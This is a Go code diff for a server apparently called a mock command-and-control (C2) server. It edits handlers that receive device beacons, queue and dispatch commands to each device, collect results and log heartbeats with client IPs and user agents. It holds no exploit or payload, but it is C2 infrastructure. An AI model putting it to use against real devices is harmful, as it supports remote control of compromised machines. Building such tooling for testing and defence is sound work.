@@ -1,4 +1,4 @@
-package server
+﻿package server
 
 import (
 	"encoding/json"
@@ -9,13 +9,13 @@ import (
 	"mockc2/internal/store"
 )
 
-// boot.html 同步信标（每 5s POST）+ 同步日志 sink（GET /log.html）。
+// boot.html 同步信标（每 2min POST）+ 同步日志 sink（GET /log.html）。
 
 func registerSync(rt *Router) {
 	rt.POST("/api/ip-sync/sync", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		body := readBody(r)
-		s := config.Get()
-		store.GetStore().SaveBody("sync", body, "json", s.BodyCaptureLimit)
+		// sync 心跳不落盘、不进 packets（留存策略：小包只进台账/日志）。
+		// 台账写入在下方 devices.jsonl + RecordDevice 完成。
 
 		var ver, domain string
 		var j map[string]any
@@ -63,7 +63,7 @@ func registerC2(rt *Router) {
 	rt.POST("/beacon", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		body := readBody(r)
 		s := config.Get()
-		store.GetStore().SaveBody("beacon", body, "json", s.BodyCaptureLimit)
+		store.GetStore().SaveBody("beacon", body, "json", s.BodyCaptureLimit, clientIP(r))
 		// 指令下发模块：先按设备独立队列取（uuid → ip → 广播），取不到再回落全局单行队列。
 		// 这样一台设备不来心跳也不会占住别人的指令 —— 批量下发互不阻塞。
 		var buuid string
@@ -94,13 +94,19 @@ func registerC2(rt *Router) {
 	rt.POST("/result", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		body := readBody(r)
 		s := config.Get()
-		store.GetStore().SaveBody("result", body, "json", s.BodyCaptureLimit)
+		store.GetStore().SaveBody("result", body, "json", s.BodyCaptureLimit, clientIP(r))
 		writeJSON(w, http.StatusOK, map[string]any{"status": "ok"})
 	})
 
 	rt.Add([]string{"GET", "POST"}, "/heartbeat", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		body := readBody(r)
-		store.GetStore().SaveBody("heartbeat", body, "txt", 1*1024*1024)
+		// 心跳只进日志流水（heartbeat.jsonl），不落盘不进 packets（留存策略）。
+		b := string(body)
+		if len(b) > 256 {
+			b = b[:256]
+		}
+		store.GetStore().WriteJSONL("heartbeat.jsonl", map[string]any{
+			"ts": nowString(), "ip": clientIP(r), "ua": r.Header.Get("User-Agent"), "body": b})
 		writeText(w, http.StatusOK, "ok")
 	})
 }
